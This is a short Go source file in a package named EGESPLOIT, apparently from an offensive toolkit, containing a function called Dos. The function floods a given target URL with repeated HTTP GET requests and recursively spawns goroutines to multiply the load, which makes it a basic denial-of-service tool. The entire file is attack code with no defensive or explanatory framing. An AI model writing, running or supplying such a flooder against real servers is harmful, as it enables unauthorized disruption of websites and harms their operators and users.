package EGESPLOIT


import "net/http"


func Dos(Target string) {

  var Count int = 0;
	var ReqCount int = 1000;

  	for {
    	Count++
    	Response, err := http.Get(Target);
    	if err != nil {
      		break;
    	}
    	Response.Body.Close();
    	if Count < ReqCount {
      		go Dos(Target)
    	}else{
      		break;
    	} 
  	}
}